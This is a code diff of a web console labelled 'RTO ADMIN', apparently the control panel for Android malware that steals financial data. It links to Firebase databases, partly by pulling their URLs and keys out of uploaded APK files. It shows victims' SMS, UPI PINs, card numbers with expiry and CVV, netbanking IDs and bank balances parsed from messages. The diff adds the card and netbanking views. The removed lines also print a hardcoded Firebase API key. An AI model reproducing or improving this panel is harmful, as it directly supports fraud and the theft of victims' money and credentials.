@@ -14,16 +14,18 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 /* ═══ LOGIN ═══ */
 .login-screen { position:fixed; inset:0; background:#050810; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; overflow-y:auto; }
 .login-box { background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; padding:26px; max-width:440px; width:100%; }
-.login-box h1 { color:#60A5FA; font-size:20px; margin-bottom:6px; text-align:center; }
-.login-box .sub { color:#64748B; font-size:11px; margin-bottom:20px; text-align:center; }
+.logo-area { text-align:center; margin-bottom:20px; }
+.logo-circle { width:80px; height:80px; margin:0 auto 12px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:38px; box-shadow:0 0 30px rgba(59,130,246,0.4); }
+.logo-area h1 { color:#60A5FA; font-size:22px; margin-bottom:4px; letter-spacing:0.05em; }
+.logo-area p { color:#64748B; font-size:11px; letter-spacing:0.15em; text-transform:uppercase; }
 
 /* Saved accounts */
-.saved-box { background:#050810; border:1px solid #1E3A8A; border-radius:12px; padding:14px; margin-bottom:16px; }
+.saved-box { background:#050810; border:1px solid #1E3A8A; border-radius:12px; padding:14px; margin-bottom:14px; }
 .saved-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; }
-.saved-head h3 { color:#60A5FA; font-size:13px; font-weight:600; }
+.saved-head h3 { color:#60A5FA; font-size:13px; font-weight:600; display:flex; align-items:center; gap:6px; }
 .acc-badge { background:#1E3A8A; color:#94A3B8; padding:3px 10px; border-radius:10px; font-size:10px; font-weight:600; }
-.acc-empty { text-align:center; padding:20px 0; color:#475569; font-size:11px; }
-.acc-empty .ico { font-size:32px; opacity:0.3; margin-bottom:8px; display:block; }
+.acc-empty { text-align:center; padding:16px 0; color:#475569; font-size:11px; }
+.acc-empty .ico { font-size:28px; opacity:0.3; margin-bottom:6px; display:block; }
 .acc-item { background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; padding:11px 12px; margin-bottom:8px; display:flex; align-items:center; gap:10px; cursor:pointer; }
 .acc-item:active { border-color:#3B82F6; background:#0F1E3D; }
 .acc-icon { width:34px; height:34px; border-radius:9px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
@@ -35,7 +37,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 /* New Account button */
 .btn-new { width:100%; padding:14px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); color:white; border:none; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
 
-/* PIN login (small) */
+/* PIN quick login */
 .pin-row { display:flex; gap:8px; margin-top:12px; }
 .pin-row input { flex:1; padding:12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:14px; text-align:center; letter-spacing:0.2em; font-family:monospace; }
 .pin-row input:focus { outline:none; border-color:#3B82F6; }
@@ -46,19 +48,19 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .new-acc { display:none; }
 .new-acc.active { display:block; }
 .back-btn { background:none; border:none; color:#60A5FA; font-size:12px; cursor:pointer; padding:0; margin-bottom:14px; display:flex; align-items:center; gap:4px; }
-.new-acc h2 { color:#FFF; font-size:15px; margin-bottom:4px; }
+.new-acc h2 { color:#FFF; font-size:16px; margin-bottom:4px; }
 .new-acc .hint { color:#64748B; font-size:10px; margin-bottom:16px; }
 
-/* Bulk Connect card */
+/* Bulk Connect */
 .bulk-card { background:linear-gradient(135deg, rgba(59,130,246,0.08), rgba(168,85,247,0.05)); border:1px solid rgba(59,130,246,0.3); border-radius:12px; padding:14px; margin-bottom:14px; }
 .bulk-card h3 { color:#F59E0B; font-size:13px; margin-bottom:6px; display:flex; align-items:center; gap:6px; }
-.bulk-card p { color:#94A3B8; font-size:10px; line-height:1.5; margin-bottom:10px; }
+.bulk-card p { color:#94A3B8; font-size:10px; line-height:1.55; margin-bottom:10px; }
 .bulk-card textarea { width:100%; min-height:100px; padding:11px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:11px; font-family:monospace; resize:vertical; line-height:1.5; }
 .bulk-card textarea:focus { outline:none; border-color:#3B82F6; }
 .btn-bulk { width:100%; padding:13px; background:linear-gradient(135deg,#06B6D4,#3B82F6); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:10px; display:flex; align-items:center; justify-content:center; gap:8px; }
 
 /* APK Upload */
-.apk-upload { background:rgba(59,130,246,0.03); border:2px dashed rgba(59,130,246,0.3); border-radius:12px; padding:24px 16px; text-align:center; margin-bottom:14px; cursor:pointer; transition:all 0.2s; }
+.apk-upload { background:rgba(59,130,246,0.03); border:2px dashed rgba(59,130,246,0.3); border-radius:12px; padding:22px 16px; text-align:center; margin-bottom:14px; cursor:pointer; }
 .apk-upload:active { background:rgba(59,130,246,0.08); border-color:#3B82F6; }
 .apk-upload .up-ico { width:50px; height:50px; margin:0 auto 12px; background:#0A1428; border:1px solid #1E3A8A; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:22px; color:#60A5FA; }
 .apk-upload h4 { color:#E5E7EB; font-size:13px; margin-bottom:4px; }
@@ -67,7 +69,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .apk-status { color:#10B981; font-size:10px; margin-top:8px; display:none; }
 .apk-status.show { display:block; }
 
-/* Form fields */
+/* Form */
 .form-sep { display:flex; align-items:center; gap:10px; margin:16px 0 14px; color:#475569; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; font-weight:bold; }
 .form-sep::before, .form-sep::after { content:''; flex:1; height:1px; background:#1E3A8A; }
 .form-label { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
@@ -164,11 +166,14 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 <!-- ═══════════════ LOGIN SCREEN ═══════════════ -->
 <div class="login-screen" id="loginScreen">
   <div class="login-box">
-    <h1>🔐 RTO ADMIN</h1>
-    <div class="sub">Device Management Console</div>
-    
     <!-- ═══ MAIN VIEW ═══ -->
     <div id="mainLoginView">
+      <div class="logo-area">
+        <div class="logo-circle">🚔</div>
+        <h1>RTO ADMIN</h1>
+        <p>Device Management Console</p>
+      </div>
+      
       <!-- Saved Accounts -->
       <div class="saved-box">
         <div class="saved-head">
@@ -197,7 +202,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
     <!-- ═══ NEW ACCOUNT VIEW ═══ -->
     <div class="new-acc" id="newAccView">
       <button class="back-btn" id="btnBack">← Back</button>
-      <h2>New Firebase Account</h2>
+      <h2>🔥 New Firebase Account</h2>
       <div class="hint">Add Firebase URL, API Key, or upload APK</div>
       
       <!-- BULK CONNECT -->
@@ -403,7 +408,7 @@ function openAccount(idx) {
   if (!acc) return;
   currentAccount = acc;
   var cfg = {
-    apiKey: acc.apiKey || "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
+    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
     databaseURL: acc.url,
     projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
   };
@@ -447,7 +452,7 @@ function startApp() {
 }
 
 // ═══════════════════════════════════════════════════════
-// NEW ACCOUNT VIEW
+// NEW ACCOUNT
 // ═══════════════════════════════════════════════════════
 function showNewAcc() {
   document.getElementById('mainLoginView').style.display = 'none';
@@ -455,6 +460,8 @@ function showNewAcc() {
   document.getElementById('newErr').textContent = '';
   document.getElementById('apkStatus').classList.remove('show');
   document.getElementById('bulkInput').value = '';
+  document.getElementById('newUrl').value = '';
+  document.getElementById('newKey').value = '';
 }
 function hideNewAcc() {
   document.getElementById('mainLoginView').style.display = 'block';
@@ -462,15 +469,13 @@ function hideNewAcc() {
 }
 
 // ═══════════════════════════════════════════════════════
-// BULK CONNECT — Parse multiple Firebase URLs
+// BULK CONNECT
 // ═══════════════════════════════════════════════════════
 function parseBulkInput(text) {
   var accounts = [];
   var seenUrls = {};
   
-  // ✅ Firebase URL pattern
   var urlRegex = /https?:\/\/[a-zA-Z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g;
-  // ✅ API Key pattern
   var keyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
   
   var urls = text.match(urlRegex) || [];
@@ -482,11 +487,10 @@ function parseBulkInput(text) {
     seenUrls[url] = true;
     accounts.push({
       url: url,
-      apiKey: keys[i] || keys[0] || "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
+      apiKey: keys[i] || keys[0] || RTO_CONFIG.apiKey,
       name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','')
     });
   }
-  
   return accounts;
 }
 
@@ -500,63 +504,27 @@ function bulkConnect() {
   document.getElementById('newErr').textContent = 'Found ' + accounts.length + ' URLs. Connecting...';
   
   var list = getSavedAccounts();
-  var added = 0;
   var tested = 0;
   
   accounts.forEach(function(acc) {
-    // Duplicate check
     var dup = list.findIndex(function(a) { return a.url === acc.url; });
-    if (dup !== -1) {
-      list[dup].apiKey = acc.apiKey;
-      tested++;
-      if (tested === accounts.length) finishBulk();
-      return;
+    if (dup === -1) {
+      list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey });
     }
-    
-    var testCfg = {
-      apiKey: acc.apiKey,
-      databaseURL: acc.url,
-      projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
-    };
-    var testApp;
-    try {
-      testApp = firebase.initializeApp(testCfg, 'bulk_' + Date.now() + '_' + added);
-    } catch(e) {
-      tested++;
-      if (tested === accounts.length) finishBulk();
-      return;
-    }
-    testApp.database().ref('device_info').limitToFirst(1).once('value')
-      .then(function() {
-        testApp.delete();
-        list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey });
-        added++;
-        tested++;
-        if (tested === accounts.length) finishBulk();
-      })
-      .catch(function() {
-        testApp.delete();
-        // Still add even if no device_info
-        list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey });
-        added++;
-        tested++;
-        if (tested === accounts.length) finishBulk();
-      });
+    tested++;
+    if (tested === accounts.length) finish();
   });
   
-  function finishBulk() {
+  function finish() {
     saveAccounts(list);
-    document.getElementById('newErr').textContent = '✅ Added ' + added + ' account(s)';
+    document.getElementById('newErr').textContent = '✅ Added ' + accounts.length + ' account(s)';
     renderAccounts();
-    setTimeout(function() {
-      hideNewAcc();
-      renderAccounts();
-    }, 800);
+    setTimeout(function() { hideNewAcc(); renderAccounts(); }, 800);
   }
 }
 
 // ═══════════════════════════════════════════════════════
-// APK UPLOAD — Extract Firebase URL + API Key
+// APK UPLOAD
 // ═══════════════════════════════════════════════════════
 function handleApkUpload(file) {
   var status = document.getElementById('apkStatus');
@@ -567,16 +535,13 @@ function handleApkUpload(file) {
   reader.onload = function(e) {
     try {
       JSZip.loadAsync(e.target.result).then(function(zip) {
-        status.textContent = '🔍 Searching for Firebase config...';
-        
-        // ✅ Search all files for Firebase URL / API Key
+        status.textContent = '🔍 Searching Firebase config...';
         var promises = [];
         var foundUrl = null, foundKey = null;
         
         zip.forEach(function(path, file) {
           if (file.dir) return;
-          // Skip big files
-          if (path.indexOf('.dex') !== -1 || path.indexOf('.so') !== -1) return;
+          if (path.indexOf('.dex') !== -1 || path.indexOf('.so') !== -1 || path.indexOf('resources.arsc') !== -1) return;
           
           promises.push(
             file.async('string').then(function(content) {
@@ -595,13 +560,11 @@ function handleApkUpload(file) {
         Promise.all(promises).then(function() {
           if (foundUrl) {
             document.getElementById('newUrl').value = foundUrl;
-            status.textContent = '✅ Firebase URL found: ' + foundUrl.substring(0, 40) + '...';
+            status.textContent = '✅ Firebase URL found';
           } else {
-            status.textContent = '⚠️ No Firebase URL found in APK';
+            status.textContent = '⚠️ No Firebase URL in APK';
           }
-          if (foundKey) {
-            document.getElementById('newKey').value = foundKey;
-          }
+          if (foundKey) document.getElementById('newKey').value = foundKey;
         });
       }).catch(function(err) {
         status.textContent = '❌ Error: ' + err.message;
@@ -614,7 +577,7 @@ function handleApkUpload(file) {
 }
 
 // ═══════════════════════════════════════════════════════
-// SAVE & CONNECT (Manual)
+// SAVE & CONNECT
 // ═══════════════════════════════════════════════════════
 function saveNewAcc() {
   var url = document.getElementById('newUrl').value.trim();
@@ -625,7 +588,7 @@ function saveNewAcc() {
     err.textContent = '❌ Invalid Firebase URL';
     return;
   }
-  if (!key) key = "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8";
+  if (!key) key = RTO_CONFIG.apiKey;
   
   err.textContent = 'Testing connection...';
   
@@ -635,38 +598,19 @@ function saveNewAcc() {
     projectId: url.replace('https://','').replace('.firebaseio.com','')
   };
   
-  var testApp;
-  try {
-    testApp = firebase.initializeApp(testCfg, 'test_' + Date.now());
-  } catch(e) {
-    err.textContent = '❌ ' + e.message;
-    return;
-  }
+  var list = getSavedAccounts();
+  var dup = list.findIndex(function(a) { return a.url === url; });
+  var acc = { name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb',''), url: url, apiKey: key };
+  if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; }
+  else list.push(acc);
+  saveAccounts(list);
   
-  testApp.database().ref('device_info').limitToFirst(1).once('value')
-    .then(function() {
-      testApp.delete();
-      var list = getSavedAccounts();
-      var dup = list.findIndex(function(a) { return a.url === url; });
-      if (dup !== -1) {
-        list[dup].apiKey = key;
-      } else {
-        list.push({ name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb',''), url: url, apiKey: key });
-      }
-      saveAccounts(list);
-      err.textContent = '✅ Connected! Opening panel...';
-      
-      setTimeout(function() {
-        // ✅ Seedha panel khole
-        currentAccount = list[list.length - 1];
-        hideNewAcc();
-        openPanel(testCfg, currentAccount.name);
-      }, 600);
-    })
-    .catch(function(e) {
-      testApp.delete();
-      err.textContent = '❌ Cannot connect: ' + e.message;
-    });
+  err.textContent = '✅ Connected! Opening panel...';
+  setTimeout(function() {
+    currentAccount = acc;
+    hideNewAcc();
+    openPanel(testCfg, acc.name);
+  }, 600);
 }
 
 // ═══════════════════════════════════════════════════════
@@ -828,13 +772,13 @@ function renderTab() {
   document.getElementById('cCard').textContent = (d.card_data || d.upi_data || d.netbanking_data) ? '1' : '0';
   
   if (curTab === 'info') {
-    var note = d.device_note || '';
     var fm = detectFromSms(all);
     b.innerHTML = 
       '<div class="dir"><span class="k">Phone Number</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_number) || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Network</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_carrier) || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Android</span><span class="v">' + esc(d.android_version || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>';
+      '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' +
+      (fm.phones.length > 0 ? '<div style="margin-top:12px;color:#64748B;font-size:10px;text-transform:uppercase;letter-spacing:0.1em;font-weight:bold;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
   } else if (curTab === 'allsms') {
     if (all.length === 0) { b.innerHTML = '<div class="empty">No SMS</div>'; return; }
     b.innerHTML = all.map(function(m) {
@@ -842,11 +786,13 @@ function renderTab() {
     }).join('');
   } else if (curTab === 'card') {
     var u = d.upi_data || {}; var c = d.card_data || {}; var bn = d.netbanking_data || {};
-    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div>';
+    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div>' +
+      '<div class="msg"><div class="msg-from">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div>' +
+      '<div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
   } else if (curTab === 'send') {
     if (b.getAttribute('data-rendered') === 'send') return;
     b.setAttribute('data-rendered', 'send');
-    b.innerHTML = '<div class="empty">Send tab — use full version</div>';
+    b.innerHTML = '<div class="empty">Send tab available in full version</div>';
   }
 }
 
@@ -923,7 +869,7 @@ function renderBank() {
   document.getElementById('cBank').textContent = bks.length;
   b.innerHTML = bks.length === 0 ? '<div class="empty">No bank messages</div>' : bks.map(function(m) {
     var bal = extractBal(m.body);
-    return '<div class="msg"><div class="msg-from">' + esc(bankName(m.sender)) + '</div><div class="msg-body">' + esc(m.body || '') + '</div></div>';
+    return '<div class="msg"><div class="msg-from">' + esc(bankName(m.sender)) + '</div><div class="msg-body">' + (bal ? '<strong>' + bal + '</strong><br>' : '') + esc(m.body || '') + '</div></div>';
   }).join('');
 }
 
